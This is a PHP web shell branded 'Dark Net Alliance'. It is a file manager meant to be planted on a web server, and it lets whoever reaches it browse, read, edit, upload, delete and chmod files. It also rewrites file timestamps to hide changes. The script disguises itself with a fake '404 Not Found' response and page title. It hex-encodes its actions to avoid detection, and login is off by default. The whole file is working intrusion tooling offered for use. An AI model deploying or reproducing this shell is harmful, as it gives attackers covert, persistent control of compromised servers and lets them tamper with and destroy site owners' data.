<?php
/*
                    O       o O       o O       o
                    | O   o | | O   o | | O   o |
                    | | O | | | | O | | | | O | |
                    | o   O | | o   O | | o   O |
                    o       O o       O o       O
                                { Dark Net Alliance }
              -----------------------------------------
              Copyright (C) 2022  Cvar1984
              This program is free software: you can redistribute it and/or modify
              it under the terms of the GNU General Public License as published by
              the Free Software Foundation, either version 3 of the License, or
              (at your option) any later version.
              This program is distributed in the hope that it will be useful,
              but WITHOUT ANY WARRANTY; without even the implied warranty of
              MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
              GNU General Public License for more details.
              You should have received a copy of the GNU General Public License
              along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

define('R4_DEBUG', true); // show post data
define('R4_SILENT_MODE', true); // 404 response code
define('R4_LOGIN_MODE', false); // cookie based authentication (Vulnerable)
define('R4_PASSPHARSE', ''); // sha1(r4)
/** Alternative Functions */
if(!function_exists('hex2bin')) {
    function hex2bin($hexdec)
    {
        $bin = pack("H*", $hexdec);
        return $bin;
    }
}
/** End of alternative Functions */
function getDirectoryContents($dir)
{
    $dirs = scandir($dir);
    $results = array();
    foreach ($dirs as $content) {
        if (is_file($content)) {
            $results['files'][] = $content;
        } elseif (is_dir($content)) {
            $results['dirs'][] = $content;
        } elseif (is_link($content)) {
            $results['dirs'][] = $content;
        }
    }
    return $results;
}
function getOperatingSystem()
{
    $os = strtolower(substr(PHP_OS, 0, 5));
    switch ($os) {
        case 'linux':
            break;
        case 'windo':
            $os = 'windows';
            break;
    }
    return $os;
}
function getFilePermission($file)
{
    return substr(sprintf('%o', fileperms($file)), -4);
}
function editFile($file)
{
?>
    <form method="post" id="form_edit" onsubmit="eno(document.getElementById('content').value);">
        <div class="row">
            <h3>Edit File</h3>
            <label>Filename : <?php echo $file; ?></label>
            <textarea class="u-full-width u-full-height" id='content' name="content"><?php echo htmlspecialchars(readFileContents($file)); ?></textarea>
            <input class="button-primary" type="submit" name="submit" value="save">
            <input type="hidden" name="path" value="<?php echo bin2hex($file); ?>">
            <input type="hidden" name="actions" value="<?php echo bin2hex("save_file"); ?>">
        </div>
    </form>
    <script>
        if (!window.unescape) {
            window.unescape = function(s) {
                return s.replace(/%([0-9A-F]{2})/g, function(m, p) {
                    return String.fromCharCode('0x' + p);
                });
            };
        }
        if (!window.escape) {
            window.escape = function(s) {
                var chr, hex, i = 0,
                    l = s.length,
                    out = '';
                for (; i < l; i++) {
                    chr = s.charAt(i);
                    if (chr.search(/[A-Za-z0-9\@\*\_\+\-\.\/]/) > -1) {
                        out += chr;
                        continue;
                    }
                    hex = s.charCodeAt(i).toString(16);
                    out += '%' + (hex.length % 2 != 0 ? '0' : '') + hex;
                }
                return out;
            };
        }

        var bin2hex = function(s) {
            s = unescape(encodeURIComponent(s));
            var chr, i = 0,
                l = s.length,
                out = '';
            for (; i < l; i++) {
                chr = s.charCodeAt(i).toString(16);
                out += (chr.length % 2 == 0) ? chr : '0' + chr;
            }
            return out;
        };

        function eno(a) {
            document.getElementById('content').value = bin2hex(a);
            document.getElementById('form_edit').submit();
        }
    </script>
<?php
    exit;
}
function filePermission($file)
{
    // Code
?>
    <form method="post">
        <div class="row">
            <h3>Change Permission</h3>
            <label>Filename : <?php echo $file; ?></label>
            <input class="u-full-width" type="text" name="permission" value="<?php echo getFilePermission($file) ?>">
            <input class="button-primary" type="submit" name="submit" value="change">
            <input type="hidden" name="path" value="<?php echo bin2hex($file); ?>">
            <input type="hidden" name="actions" value="<?php echo bin2hex("chmod_save"); ?>">
        </div>
    </form>
<?php
    exit;
}

function fileChangedate($file)
{
    // Code
?>
    <form method="post">
        <div class="row">
            <h3>Change Date</h3>
            <label>Filename : <?php echo $file ?></label>
            <input class="u-full-width" type="text" name="date" value="<?php echo fileDate($file) ?>">
            <input class="button-primary" type="submit" name="submit" value="change">
            <input type="hidden" name="path" value="<?php echo bin2hex($file); ?>">
            <input type="hidden" name="actions" value="<?php echo bin2hex("touch_save"); ?>">
        </div>
    </form>
<?php
    exit;
}

function getOwnership($filename)
{

    if (!function_exists('stat')) {
        $group = '????';
        $user = '????';
        return compact('user', 'group');
    }
    $stat = stat($filename);
    if (function_exists('posix_getgrgid')) {
        $group = posix_getgrgid($stat[5])['name'];
    } else {
        $group = $stat[5];
    }
    if (function_exists('posix_getpwuid')) {
        $user = posix_getpwuid($stat[4])['name'];
    } else {
        $user = $stat[4];
    }
    return compact('user', 'group');
}
function getFileColor($file)
{
    if (is_writable($file)) {
        return 'lime';
    } elseif (is_readable($file)) {
        return 'gray';
    } else {
        return 'red';
    }
}
function fileDate($file)
{
    return @date("d-m-Y H:i:s", filemtime($file));
}
function changeFileDate($filename, $date)
{
    return @touch($filename, @strtotime($date));
}
function xorString($input, $key)
{
    $textLen = strlen($input);

    for ($x = 0; $x < $textLen; $x++) {
        $input[$x] = ($input[$x] ^ $key);
    }
    return $input;
}
function readFileContents($file)
{
    if (function_exists('file_get_contents')) {
        return file_get_contents($file);
    } elseif (function_exists('fopen')) {
        $fstream = fopen($file, 'r');
        if (!$fstream) {
            //fclose($fstream);
            return false;
        }
        $content = fread($fstream, filesize($file));
        fclose($fstream);
        return $content;
    }
}
function writeFileContents($filename, $content)
{
    if (!is_writable($filename)) {
        return false; // not writable
    }
    if (function_exists('file_put_contents')) {
        return file_put_contents($filename, $content);
    } elseif (function_exists('fopen')) {
        $handle = fopen($filename, 'wb');
        fwrite($handle, $content);
        fclose($handle);
        return true;
    }
    return false; // all function disabled
}
function deleteAll($filename)
{
    if (is_dir($filename)) {
        foreach (scandir($filename) as $key => $value) {
            if ($value != "." && $value != "..") {
                if (is_dir($filename . DIRECTORY_SEPARATOR . $value)) {
                    deleteAll($filename . DIRECTORY_SEPARATOR . $value);
                } else {
                    @unlink($filename . DIRECTORY_SEPARATOR . $value);
                }
            }
        }
        return @rmdir($filename);
    } else {
        return @unlink($filename);
    }
}
function activateLoginSystem()
{
    if(!isset($_COOKIE['r4'])) {
        authLogin();
    }
    if(isset($_COOKIE['r4'])) {
        if($_COOKIE['r4'] !== R4_PASSPHARSE) {
            authLogin();
        }
    }
}
function authLogin()
{
    if (isset($_POST['id'])) {
        if (sha1($_POST['id']) === R4_PASSPHARSE) {
            setcookie('r4', R4_PASSPHARSE);
        }
        chdir(getcwd());
    }
    ?>
    <form method="post" id="form_login">
        <div class="row">
            <input type="password" name="id" value="">
            <input type="submit" name="submit" value="<<<<">
        </div>
    </form>
    <?php
    die;
}
/**
 * Get path to directory or files if set to true get the latest directory after an action
 */
function getPath($opt = false)
{
    if(!isset($_COOKIE['path'])) {
        $path = isset($_POST['path']) ? $_POST['path'] : bin2hex(getcwd());
        setcookie('path', $path);
    }
    $pathToFileOrDir = isset($_POST['path']) ? hex2bin($_POST['path']) : hex2bin($_COOKIE['path']);

    if($opt) {
        return dirname($pathToFileOrDir);
    }
    else {
        return $pathToFileOrDir;
    }
}

if (R4_SILENT_MODE) {
    header('HTTP/1.1 404 Not Found');
}
if (R4_LOGIN_MODE) {
    activateLoginSystem();
}
if (R4_DEBUG) {
    var_dump($_POST);
}
// Preaction

if (isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $fileCount = count($file['name']);

    for ($x = 0; $x < $fileCount; $x++) {
        $fileOrigin = $file['tmp_name'][$x];
        $fileDestination = getPath(true) . DIRECTORY_SEPARATOR . $file['name'][$x];
        if(!@move_uploaded_file($fileOrigin, $fileDestination)) {
            $failedFlag = true;
        }
    }
    if(isset($failedFlag)) {
        echo '<script>alert("Upload failed");</script>';
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>

    <!-- Basic Page Needs
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
    <meta charset="utf-8">
    <title>404 Not Found</title>
    <meta name="author" content="Cvar1984">
    <meta name="robots" content="noindex, nofollow">
    <link rel="icon" type="image/x-icon" href="https://i.postimg.cc/cCdR8xkF/dna.png">
    <!-- Mobile Specific Metas
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- CSS
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/skeleton/2.0.4/skeleton.min.css" integrity="sha512-EZLkOqwILORob+p0BXZc+Vm3RgJBOe1Iq/0fiI7r/wJgzOFZMlsqTa29UEl6v6U6gsV4uIpsNZoV32YZqrCRCQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Ubuntu+Mono&display=swap');

        :root {
            --text-color: white;
            --background-color: black;
            --font-style: 'Ubuntu Mono';
        }

        a {
            color: var(--text-color);
        }

        a:link {
            text-decoration: none;
        }

        a:visited {
            text-decoration: none;
        }

        a:hover {
            text-decoration: none;
        }

        a:active {
            text-decoration: none;
        }

        .icon_folder {
            vertical-align: middle;
            width: 25px;
            height: 25px;
            content: url('https://i.postimg.cc/W4WynX8V/folder-icon.png');
        }

        .icon_file {
            vertical-align: middle;
            width: 25px;
            height: 25px;
            content: url('https://i.postimg.cc/T3THvZHG/Documents-icon.png');
        }

        textarea {
            resize: none;
        }

        textarea.u-full-height {
            height: 50vh;
        }

        td.files {
            cursor: pointer;
        }

        body {
            background-color: var(--background-color);
            color: var(--text-color);
            font-family: var(--font-style), monospace;
            height: 100%;
        }
        .bg-image {
            /* Center and scale the image nicely */
            background-position: center;
            background-repeat: no-repeat;
            background-size: cover;
            background-image: linear-gradient(
                rgba(0, 0, 0, 0.5),
                rgba(0, 0, 0, 0.5)),
                url('https://i.postimg.cc/Z549LsJM/x.gif');
            background-attachment: fixed;
        }

        @media only screen and (max-device-width: 1366px) {
            .parallax {
                background-attachment: scroll;
            }
        }
    </style>
</head>

<body class="bg-image">
    <?php
    if (isset($_POST['actions'])) {
        $actions = $_POST['actions'];
        $actions = hex2bin($actions);
        switch ($actions) {
            case 'open_file':
                editFile(getPath());
                break;
            case 'save_file':
                if (!writeFileContents(hex2bin($_POST['path']), hex2bin($_POST['content']))) {
                    echo "failed";
                }
                chdir(getPath(true));
                break;
            case 'open_dir':
                chdir(getPath());
                break;
            case 'chmod':
                filePermission(getPath());
                break;
            case 'chmod_save':
                if (!@chmod(getPath(), octdec($_POST['permission']))) {
                    echo 'failed';
                }
                chdir(getPath(true));
                break;
            case 'touch':
                fileChangedate(getPath());
                chdir(getPath(true));
                break;
            case 'touch_save':
                if (!changeFileDate(getPath(), $_POST['date'])) {
                    echo "failed";
                }
                chdir(getPath(true));
                break;
            case 'rm':
                if (!deleteAll(getPath())) {
                    echo "failed";
                }
                chdir(getPath(true));
                break;
        }
    }
    ?>
    <script>
        if (!window.unescape) {
            window.unescape = function(s) {
                return s.replace(/%([0-9A-F]{2})/g, function(m, p) {
                    return String.fromCharCode('0x' + p);
                });
            };
        }
        if (!window.escape) {
            window.escape = function(s) {
                var chr, hex, i = 0,
                    l = s.length,
                    out = '';
                for (; i < l; i++) {
                    chr = s.charAt(i);
                    if (chr.search(/[A-Za-z0-9\@\*\_\+\-\.\/]/) > -1) {
                        out += chr;
                        continue;
                    }
                    hex = s.charCodeAt(i).toString(16);
                    out += '%' + (hex.length % 2 != 0 ? '0' : '') + hex;
                }
                return out;
            };
        }

        var bin2hex = function(s) {
            s = unescape(encodeURIComponent(s));
            var chr, i = 0,
                l = s.length,
                out = '';
            for (; i < l; i++) {
                chr = s.charCodeAt(i).toString(16);
                out += (chr.length % 2 == 0) ? chr : '0' + chr;
            }
            return out;
        };
        var hex2bin = function(s) {
            return decodeURIComponent(s.replace(/../g, '%$&'));
        };

        function cd(path) {
            document.getElementById('actions').value = bin2hex("open_dir");
            document.getElementById('path').value = bin2hex(path);
            document.getElementById('action_container').submit();
        }

        function vi(path) {
            document.getElementById('actions').value = bin2hex("open_file");
            document.getElementById('path').value = bin2hex(path);
            document.getElementById('action_container').submit();
        }

        function chmod(path) {
            document.getElementById('actions').value = bin2hex("chmod");
            document.getElementById('path').value = bin2hex(path);
            document.getElementById('action_container').submit();
        }

        function touch(path) {
            document.getElementById('actions').value = bin2hex("touch");
            document.getElementById('path').value = bin2hex(path);
            document.getElementById('action_container').submit();
        }

        function rm(path) {
            document.getElementById('actions').value = bin2hex("rm");
            document.getElementById('path').value = bin2hex(path);
            document.getElementById('action_container').submit();
        }
    </script>

    <table class="u-full-width">
        <thead>
            <tr>
                <th>Name</th>
                <th>Date Modified</th>
                <th>Ownership</th>
                <th>Permission</th>
            </tr>
        </thead>
        <tbody>
            <?php $contents = getDirectoryContents(getcwd());
            // Directory fetch
            if (isset($contents['dirs'])) {
                foreach ($contents['dirs'] as $dirName) {
                    $path = getcwd();
                    $path = str_replace('\\', '/', $path);
                    $path = $path . '/' . $dirName;
                    $perm = getFilePermission($path);
                    $date = fileDate($path);
                    $ownership = getOwnership($path);
                    $user = $ownership['user'];
                    $group = $ownership['group'];
                    $color = getFileColor($path);
                    echo "<tr>
                            <td class='files' onclick='cd(\"{$path}\");'>
                            <img class='icon_folder' /><a href='javascript:cd(\"{$path}\");'>&nbsp;{$dirName}</a></td>
                            <td><a href='javascript:touch(\"{$path}\");'>{$date}</a></td>
                            <td>{$user}:{$group}</td>
                            <td><a href='javascript:chmod(\"{$path}\");' style='color:{$color};'>{$perm}</a></td>
                        </tr>";
                }
            }
            // Files fetch
            if (isset($contents['files'])) {
                foreach ($contents['files'] as $fileName) {
                    $path = getcwd();
                    $path = str_replace('\\', '/', $path);
                    $path = $path . '/' . $fileName;
                    $perm = getFilePermission($path);
                    $date = fileDate($path);
                    $ownership = getOwnership($path);
                    $user = $ownership['user'];
                    $group = $ownership['group'];
                    $color = getFileColor($path);
                    echo "<tr>
                            <td class='files' onclick='vi(\"{$path}\");'>
                            <img class='icon_file' /><a href='javascript:vi(\"{$path}\");'>&nbsp{$fileName}<a/></td>
                            <td><a href='javascript:touch(\"{$path}\");'>{$date}</a></td>
                            <td>{$user}:{$group}</td>
                            <td><a href='javascript:chmod(\"{$path}\");' style='color:{$color};'>{$perm}</a></td>
                        </tr>";
                }
            } ?>
        </tbody>
    </table>

    <!-- Uploader-->
    <form method="POST" enctype="multipart/form-data">
        <div class="">
            <input type="file" name="file[]" multiple />
        </div>
        <button class="button-primary" type="submit" name="submit_file">Upload</button>
    </form>

    <!-- Hidden action encoder-->

    <form id="action_container" method="POST">
        <input type="hidden" id="path" name="path" />
        <input type="hidden" id="actions" name="actions" />
    </form>
</body>

</html>